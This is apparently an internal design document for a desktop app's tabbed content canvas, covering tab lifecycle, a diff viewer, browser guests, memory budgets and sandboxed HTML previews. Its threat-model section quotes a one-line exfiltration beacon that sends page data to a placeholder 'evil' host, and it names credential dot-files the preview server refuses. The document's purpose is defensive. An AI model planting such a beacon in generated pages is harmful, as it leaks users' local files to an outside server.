# Content Canvas

The tabbed pane beside the chat that shows files, web pages, terminals, teams,
goals and code changes. One `canvasLifecycle` (`services/canvas-lifecycle.ts`) owns every
tab and every resource behind one (browser pages, file content, pty
attachment); React renders what it says.

## Parts

| Part | File | Owns |
|---|---|---|
| Lifecycle manager | `services/canvas-lifecycle.ts` | tabs (`TabState`), active tab, open state, browser page create/show/hide/destroy requests, file reads, disk-change handling, budgets |
| Browser host | `browser-host/index.ts` | permanent guest DOM attachment, CSS presentation, and the visible viewer's borrowed surface; mounted outside routes by `App` |
| Budget planner | `services/canvas-budget.ts` + `shared/constants/canvas-budget.ts` | which hidden tabs give up content, views, or close |
| React bindings | `hooks/useCanvasLifecycle.ts` | `useTabList`, `useActiveTab`, `useActiveTabId`, `useCanvasIsOpen`, `useTabCount`, `useBrowserState`, `useCanvasActions` |
| Legacy store proxy | `stores/canvas.store.ts` | open/maximized state for pages outside the canvas; budget-eviction toast |
| Host | `ContentCanvas.tsx` | tab bar, keyboard shortcuts, `TabContent` (loading/error states + `ViewerHost` boundary) |
| Collapse / restore | `CanvasToggleButton.tsx` | the tab bar's collapse action (tabs stay) and the page-edge handle that brings a collapsed canvas back, showing its tab count |
| Registry | `viewer-registry.tsx` | `VIEWERS: Record<ContentType, ViewerSpec>`, `viewerFor(type)`, `viewerBringsFileList(type)` (exported for the page layout) |
| Viewer resources | `viewer-resources.ts` | `DisposableStore`, `useViewerResources()` |
| Viewers | `viewers/*` | rendering one tab |

## Tab state and notifications

`TabState` objects are immutable: every change replaces the object, so
identity says whether anything changed. The one exception is `tab.view`, a
view memory (scroll offset) that viewers write without notification and that
every snapshot of the tab shares.

Notifications are split by what changed, so each subscriber re-renders only
for what it shows:

| Channel | Fires on | Consumers |
|---|---|---|
| `onTabListChange` | add / remove / reorder, or a field in `TAB_LIST_FIELDS` (type, title, path, url, dirty, loading, error) | tab strip, tab count, telemetry, goal titles |
| `onTabChange(tab)` | any change to one tab | `useActiveTab` (re-renders only when the active tab's object changed) |
| `onBrowserStateChange(tabId)` | a browser page's navigation state | `useBrowserState(tab.id)` |
| `onActiveTabChange`, `onOpenStateChange` | active tab / open state | host |

`getTabs()` is always current; `getTabListSnapshot()` is the tab strip's stable
array and may lag on fields the strip does not show.

## Files changing on disk

The lifecycle consumes `artifact:changed-batch` (`'change'` and `'add'`, the
latter for atomic temp+rename writers; `resync` = every file tab):

- A clean tab re-reads **in place** — the viewer stays mounted and swaps the
  text. The editor applies it with `addToHistory: false`: an outside
  replacement is not undoable and never costs a whole-document copy in
  history.
- A tab with unsaved edits is never overwritten. The file is read and
  compared with `savedContent` (the disk text as of the first edit); only a
  real divergence sets `diskConflict`, and the editor asks: load the disk
  version, or keep my edits (a save then overwrites). Our own save echoing
  back is not a conflict.

## Going back to a place

A row of a reference chip's list (or a `path:line` link in a reply) asks a tab
to show a place through `TabState.reveal` — a one-shot `RevealRequest { seq,
range?, quote?, passage?, keepFocus?, commentId?, path?, side?, page? }` set by
`openFile(path, { reveal })`, `openTerminal(sessionId, title, { reveal })`,
`openChanges(source, { reveal })` or `revealInTab(tabId, target)`. `keepFocus`
means the request came from the composer: the viewer shows the place without
taking keyboard focus. `commentId` means a pending comment was gone back to in
order to edit it: its card there takes the focus instead — pass it to
`revealInEditor` / `revealInElement` (a terminal opens it with
`openCommentCard` beside the output).

- The viewer handles it once its content is in, then calls
  `useCanvasActions().consumeReveal(tab.id, seq)`; a stale `seq` never clears a
  newer request, and a repeat request for the same place gets a new `seq`.
- The place is found again by its text when the content changed
  (`components/references` → `revealInEditor` / `revealInElement`, or
  `relocateLines` over a document the viewer holds itself): found as it was,
  found elsewhere ("moved", lit at its new place), or gone ("lost", the
  original lines shown unlit). `notifyRevealOutcome` says which.
- A viewer that cannot show the place (the file is not among what it shows)
  hands it on with `revealFileAt(path, target)`, which opens the file there or
  says the file no longer exists.
- A comment can always be edited. Its card takes the focus when it mounts, so
  a tab or editor still on the way is waited for (`focusCommentCard`). With no
  card to show it in — a view that draws none for it, a passage gone from
  rendered text, a closed terminal, a deleted message or file, a file that
  cannot be read — it opens in the floating card after the usual notice:
  beside its lines or at the top of the place when that shows, else beside the
  composer's comments chip (`openCommentCardAtComposer`).
- The light is a decoration (or CSS highlight) removed on a timer, never an
  animation alone, so it survives reduced motion.

## Changes view

The `changes` content type (`viewers/changes/`) shows code changes read-only
as diffs. `openChanges(source, { reveal })` keeps one tab per source:

| Source | Tab | Shows |
|---|---|---|
| `{ kind: 'git', spaceId, repoRoot? }` | one per space | the space's Git repositories (the space folder and the folders directly inside it): compare scope, "Changes" and "Overview & review" sub-pages, file list, staging and commit |
| `{ kind: 'message', spaceId, conversationId, messageId, title, replyAt }` | one per reply | what one AI reply wrote with its file tools ("View changes" under the reply); no repository, scope or commit |

- **Data per mounted viewer.** Each git tab's viewer creates its own vanilla
  store (`state/git-changes-store.ts`) and disposes it on unmount. It loads on
  mount (opening or returning to the tab), on window focus, after the user's
  own operations and on the tab's Refresh (`setRefreshHandler('changes')`) —
  never on a timer. File events only feed the "New changes in N files" hint
  from a debounced status read, which waits while the window is hidden (coming
  back reloads, or checks then); the diffs on screen are redrawn only when the
  user asks. The viewer holds the space's file watching while it is mounted.
- **Memory in `tab.view.changes`** (type in `types/changes-view.ts`, so the
  lifecycle does not reach into the viewer): sub-page, repository, scope,
  filter, folded and loaded cards, files a reference forced into view, scroll
  anchors, the detail page and the commit message draft. Display preferences
  (side by side, collapse unchanged, file list and its width, tree, hide generated) are per
  user, in `stores/changes-view-prefs.store.ts`; going back to a place never
  changes them.
- **Bounded rendering and reads.** Small diffs keep all file cards mounted in a
  native scroller. Larger diffs show one selected file, with explicit previous /
  next file controls and file-list selection (`diff/stack-policy.ts`: file,
  changed-line, text and fragment budgets). Scrolling never evicts editors or
  substitutes placeholders. Already-read text checks the aggregate budget before
  editors mount, since changed-line counts cannot price unchanged context
  (`ReadBudget`). Its sizes belong to the repository and compare scope they were
  read under: another scope forgets them, while a refresh of the same scope keeps
  them, so a large diff does not show every file again only to read them all. A
  "Load diff" that tips the budget shows the file it loaded. A
  reply file with many edit fragments pages them explicitly; chunk navigation
  crosses those pages, and the tab remembers each file's last fragment page. CodeMirror still
  renders only its visible lines. File contents are read three at a time,
  newest request first; folding or selecting another file cancels reads before
  they start (`state/request-queue.ts`). Texts share a 32M-character cache per
  load. Generated and very large diffs wait for "Load diff"; binary and
  over-limit files never load text.
- **One order.** The diffs are in the file list's order (`inPanelOrder`): its
  groups, then Tree (folders first) or List (whole paths), names compared
  naturally. Next file, F7 and "k of N" walk the list as it reads.
- **Landing where a jump aims.** File-list selections and saved scroll anchors
  use the mounted card's actual position; content resizes preserve the requested
  position only until the user takes over. Reveals wait for the file's editors
  and their CodeMirror measurement, not an estimated list position. Editors
  scroll places into view on the stack's native scroller
  (`EditorView.scrollHandler`). Pending comments keep their lines unfolded
  (`onLines` → `expandCollapsedAt`).
- **File hierarchy.** Paths are compared once per change list or mode switch
  (`createPathOrder`); the groups a filter narrows on every keystroke are only
  arranged by that order, and folding only flattens again. Only uninterrupted
  single-child directory chains are compacted; branching parents contain their
  subfolders. Deep rows stop indenting before a file's name loses its room.
  Rows remain virtualized independently of the diff cards.
- **Width-driven layout.** Columns follow the viewer's own width (the canvas
  can be narrow on a wide window): side by side needs a 640px diff area; the
  file list docks from 740px and is a modal drawer below that. The docked list
  resizes within 220–480px while leaving at least 480px for content. Pointer
  movement re-renders only the panel (mounted editors re-wrap to the new width);
  the saved preference and the side-by-side / inline choice change on release.
  Keyboard resizing and double-click reset share the same bounds.
  Canvas resize re-renders the view only across layout steps.
- **Pointing and going back.** Both sides of every diff are referenceable
  (`referenceExtension`; in the inline layout the deleted lines are the before
  side). A reply's edits carry no repository, so their references hold the
  text only. The viewer consumes `reveal` itself: `page: 'overview'` opens that
  sub-page; `path` + `side` + `range` switches to the deepest repository holding
  the file and shows the line in the diff (a renamed file's before side by its
  old path, the inline layout's before side found again by its text), unfolding
  a collapsed unchanged region; what it cannot show goes to `revealFileAt`.
- **AI review.** The overview's review card starts a review through
  `api.codeReviewStart` (a conversation of the space; its last reply is the
  report). The card exists only while the overview is shown, so it follows the
  review with `useReviewProgress` only then. It counts the files changed since
  the reviewed snapshot (a snapshot of the whole working tree in the main
  process) when it first appears, when it appears again after the view saw
  file changes (a detail page or the Changes page unmounts it), on Refresh and
  after a discard — never on focus or on file events while it is shown. The
  count is kept for the view's lifetime (`ChangedSinceCounter`), so coming back
  shows the last one at once. Report links to files of the list open a detail
  page walked through the files the report names; Esc returns to the link.

## Browser page lifetime and presentation

The browser manager in main owns page identity, navigation, policy, CDP and
destruction. `browserViewId` and the existing browser API names remain the
public identifiers; their carrier is now an Electron `webview` guest.

`App` mounts one `browser-host` outside routed React pages. Its public
`mountBrowserHost(container, bridge)` also powers the minimal hidden-host
entry for pages that can never be shown. Each guest is appended once with its
immutable creation URL, partition and attachment token. Show/hide and resize
only change CSS. No tab switch, route change, budget calculation or DOM portal
may reparent the node. A remove command with its current token is the only
page-level detach. The initial snapshot cannot overwrite commands received
while it was in flight.

`BrowserViewer` borrows a presentation surface through `bindBrowserSurface`.
Unmounting or blocking the surface immediately parks its guest off-screen,
without waiting for IPC; the last viewport stays nonzero so background work
can still produce frames. Resize, scroll and active layout animations update
the guest locally. A temporary frame lease for a screenshot or an AI input
operation places that same guest at the viewport origin with zero opacity and
pointer input disabled, preserving its size. Main waits for a token-matched
acknowledgement after two animation frames. The entire input operation holds the
lease so intermediate focus, clicks and keystrokes share one presented surface.
Ending the lease restores off-screen parking. Removing a page or disposing the
host cancels its pending acknowledgement. Main still receives the existing layout calls and supplies
the optional H5 viewport width. Guests use CSS pixels, including when the app
is zoomed.

Guest nodes sit at z-index 1. Menus, dialogs, toasts and the maximized canvas's
chat capsule share the host DOM and can cover them. The mobile canvas does not
create a higher z-index group around its background; the browser surface is
therefore visible above it while the existing global overlays remain above the
guest. The underlying mobile chat has its own isolated stacking context, so its
scroll button and composer menus cannot appear through the canvas; global
portal dialogs still cover both. Native browser context menus retain their behavior. Closing a menu only
returns focus to a visible guest when the invoking button still has focus.

The shared layer tokens in `globals.css` keep resource-sheet interactions below
blocking portal dialogs, including a file deletion confirmed while the resource
sheet remains open:

| Surface | Layer |
|---|---|
| Browser guest | 1 |
| Resource trigger (`--layer-workspace-trigger`) | 60 |
| Resource sheet (`--layer-workspace-sheet`) | 70 |
| Global search backdrop / panel | 100 / 101 |
| Blocking portal dialog (`--layer-global-modal`, used by `ConfirmDialog`) | 120 |

Global dialogs opened from a sheet use the shared modal layer and a body portal;
raising only the dialog's inner content cannot escape a parent stacking context.

Address-bar and Home navigation belong to the tab lifecycle. A request made
before guest attachment waits for that tab's creation, survives switching away,
and is cancelled if the tab closes before the guest becomes ready.

Canvas-owned pages are destroyed on tab close and released by the existing
budgets. AI-owned pages only lose their presentation on tab close or a space
switch: their owner keeps them alive and eventually sends the remove command.
Possible-to-show AI pages live in the main host from creation; they never move
from a hidden window to the main window. Renderer reload destroys that host's
guests, and main reports the lost pages through the existing lifecycle events.
`browser:page-gone` also invalidates owned Canvas attachments: a visible tab
recreates its page from its last URL; a hidden tab waits for activation or
canvas expansion. Explicit tab close and budget eviction suppress recovery.
An AI-attached tab continues to follow its owner's existing loss event.

Desktop PDFs use Chromium's native PDF viewer in the same guest host. Remote
PDFs still use pdfjs, and remote browser tabs still show the desktop-client
fallback; neither path initializes an Electron host.

## Budgets

Applied after every activation and every new browser page
(`shared/constants/canvas-budget.ts`), least recently activated first:

| Budget | Default | Over it |
|---|---|---|
| `MAX_OPEN_TABS` | 30 | close the tab; the user sees a toast |
| `MAX_LIVE_BROWSER_VIEWS` | 6 | destroy an owned hidden browser page, keep its url; recreated when shown |
| `HIDDEN_CONTENT_BUDGET_BYTES` | 64 MB | drop a hidden file tab's content/bytes (`contentUnloaded`); re-read when shown |

Never touched: the active tab, tabs with unsaved edits, terminals (closing
would end or prompt about a live pty), AI-attached browser views (the AI's
session outlives the tab), and content that cannot be re-read (no path).

Memory pressure (`app:memory-pressure`, from the main process health sampler)
at `critical` applies the budgets with zero allowance for hidden content and
hidden views. Tabs themselves stay; everything reloads on activation.

## Canvas Viewer rules

Rules marked ⚙ are enforced by `tests/unit/architecture/canvas-viewers.guard.test.ts`.

1. ⚙ **One instance per tab.** The host mounts `<TabContent key={tab.id}>`.
   Switching tabs remounts the viewer, so no editor history, edit mode or UI
   state crosses tabs. A viewer never has an effect keyed on `tab.id` (it
   would be dead code or a sign of reuse).
2. ⚙ **Imperative resources are registered.** Workers, observers,
   `EditorView`/`Terminal` instances, `api.on*` subscriptions, pdf loading
   tasks, object URLs and intervals are created inside
   `resources.add(...)` / `scope.add(...)` from `useViewerResources()`. The
   store releases newest-first on unmount, and anything added after that (a
   late async result) is released on arrival. An effect that recreates
   resources takes a `scope()` and disposes it in its cleanup.
3. ⚙ **No global canvas state in viewers.** A viewer reads its `tab` prop,
   `useBrowserState(tab.id)` and `useCanvasActions()` (stable functions) —
   never `useTabList`/`useActiveTab`/the canvas store, and only type imports
   from the lifecycle or store.
4. **Large content is not derived in render.** Anything O(n) over
   `tab.content`/`tab.bytes` (split, parse, chunk) is memoized on the content
   or runs in a worker; counts use `countLines()` instead of `split`.
5. **Outside refresh is not undoable and never overwrites edits** (see above).
6. **State that must survive a switch lives on the tab.** Scroll offset in
   `tab.view`; unsaved edits, the saved baseline and edit mode (derived from
   `isDirty`) on `TabState`. Component state holds only what may reset on
   remount (copied, saving, hover).
7. ⚙ **The host owns boundaries.** Every viewer renders inside `ViewerHost`
   (per-tab `ErrorBoundary` + `Suspense`); viewers do not add their own.
8. **Hidden = unmounted.** No viewer stays mounted while hidden. Browser guests
   are resources in the separate permanent host, not kept-alive viewers; their
   existing ownership and budgets govern release. Any other viewer keep-alive
   needs a registry flag bounded by a small cap, added together with its first
   real consumer — not before.
9. ⚙ **Registry, not switch.** `VIEWERS` is `Record<ContentType, ViewerSpec>`;
   the host has no switch over types and imports no viewer. An unknown type
   (e.g. from a newer main process) resolves to the text viewer, and
   `openFile` normalizes it to `'text'`.
10. **Notifications by granularity** (see the table above); there is no
    catch-all "tabs changed" event.

## HTML preview isolation

Generated HTML is untrusted. It never runs in the app origin:

| Where | Frame | Origin / process | Relative URLs | Remote resources |
|---|---|---|---|---|
| Desktop, file inside a space | `src="halo-preview://<random host>/<file>"`, sandbox + `allow-same-origin` | its own site → out-of-process frame, no preload bridge, own storage | served natively from the file's directory tree only (`..`, encoded traversal and symlinks out of it are refused) | its own CSP (`PREVIEW_DOCUMENT_POLICY`): https: scripts/styles/images/fonts, same-origin fetches only (`connect-src 'self'`, `form-action 'self'`); never `halo-file:`, other previews or the app |
| No file (generated content), file outside every space (Downloads, Desktop, drives — its folder holds unrelated files), remote clients, preview origin unavailable | `srcdoc`, sandbox **without** `allow-same-origin` | opaque; inherits the app CSP | `<base href="halo-file://<dir>/">` when a local file exists (images only — the inherited CSP blocks scripts/styles from it) | per the app CSP |

The main process (`foundation/protocol.service.ts`) maps each preview host to
one directory; the viewer asks for a host on mount (`canvas-preview:open`) and
releases it on unmount through its resource store. Top navigation, popups
escaping the sandbox, and plugins stay blocked in both modes.

What the preview origin will and will not serve:
- Never a dot-file or dot-directory (`.ssh`, `.env`, `.git`), including one
  reached through a visible symlink, and never a hidden file as the page itself.
- Not offered at all — the viewer previews in srcdoc instead — when the file's
  directory is the filesystem root, the home directory or an ancestor of it, or
  contains the Halo data directory or the app's userData. `report.html` saved in
  `~` or `/` therefore never gets a site that spans the user's files. Halo's own
  artifact folder (inside the data directory) is served: it does not contain it.
- Script in the page can read what the server exposes but cannot send it
  anywhere with fetch/XHR/WebSocket/form posts (`'self'` only).
- Each preview's storage (localStorage, IndexedDB, cache, cookies) is erased
  when its preview closes or is evicted by the 64-host cap. Accepted residual:
  previews open when the app crashes keep their (small) storage, since the
  random origin needed to clear it is gone.

Residual risk, accepted: https: is allowed for scripts, styles, images, fonts,
frames and (sandbox `allow-popups`) popups, and any of those is a GET the page
controls (`new Image().src = 'https://evil/?' + data`). A page can therefore
still leak the non-hidden files of its own directory tree to a server it names,
by URL. The directory scoping above is what bounds this: a page can only
exfiltrate what sits beside the HTML file it came from.

Rules:
- ⚙ A `srcdoc` frame never has `allow-same-origin`; only the preview-origin
  frame (loaded by `src`) may, because its origin is its own site.
- `halo-file://` is served inert as a document (`CSP: sandbox`) and must not be
  added to the app CSP's `connect-src`/`frame-src`/`script-src`. The app CSP's
  `frame-src` allows `halo-preview:` and nothing else beyond `'self'`.
- Any new preview surface for untrusted documents uses the preview origin, not
  a same-origin frame.

## Adding a viewer

- [ ] Add the content type to `CONTENT_TYPES`; the compiler lists the registry entry to add.
- [ ] Register it in `viewer-registry.tsx` (lazy import for heavy parsers; `ownsLoading`/`ownsError` if it renders those itself; `bringsFileList` if it shows a file list of its own, so the space's resource rail steps aside while it is the active tab).
- [ ] Take `ViewerProps` (use the subset you need); no canvas store/hook imports.
- [ ] Every imperative resource through `useViewerResources()`.
- [ ] Derivations memoized; lists over ~128k chars virtualized (chunk Virtuoso / TableVirtuoso / CodeMirror viewport).
- [ ] Scroll/view memory in `tab.view`, not component state.
- [ ] Native resources (browser guest, pty, worker pool) get a single release point in the lifecycle and a budget entry.
- [ ] Third-party renderer: count `createObjectURL`/`revokeObjectURL` and listener add/remove; unpaired ones get a `patches/` fix plus a guard (docx-preview, xterm).
- [ ] Text the user can point at goes through a `components/references` adapter (CodeMirror extension — it also draws pending comments as cards under their lines —, `useTextReferences`, terminal), and the viewer consumes `tab.reveal`, `commentId` included (see "Going back to a place").
- [ ] Unit tests for its pure logic; a `tests/perf` scenario if it can hold large content.
